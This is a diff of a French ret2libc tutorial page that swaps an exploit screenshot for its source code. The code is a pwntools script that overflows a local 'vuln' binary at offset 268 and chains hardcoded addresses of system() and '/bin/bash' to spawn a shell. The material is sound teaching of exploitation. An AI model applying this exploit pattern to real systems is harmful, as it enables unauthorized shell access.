@@ -344,7 +344,19 @@ Les bases sont posées, maintenant, walkthrough !</li>
 
 <p>Maintenant qu&rsquo;on a tout ce qu&rsquo;il nous faut, on écrit notre exploit :</p>
 
-<p><img class="img_full" src="/hacking/pwn_2of4_ret2libc/exploit.png" alt="exploit" ></p>
+<pre><code class="language-python">#!/usr/bin/en python2
+
+from pwn import *
+
+offset = 268
+payload = &quot;A&quot; * offset
+payload += p32(0xf7dfa7d0) # @system
+payload += p32(0x42424242) # @retour - foo
+payload += p32(0xf7f3688a) # @&quot;/bin/bash\x00&quot;
+
+r = process([&quot;./vuln&quot;, payload])
+r.interactive()
+</code></pre>
 
 <p>Remarque :</p>
 
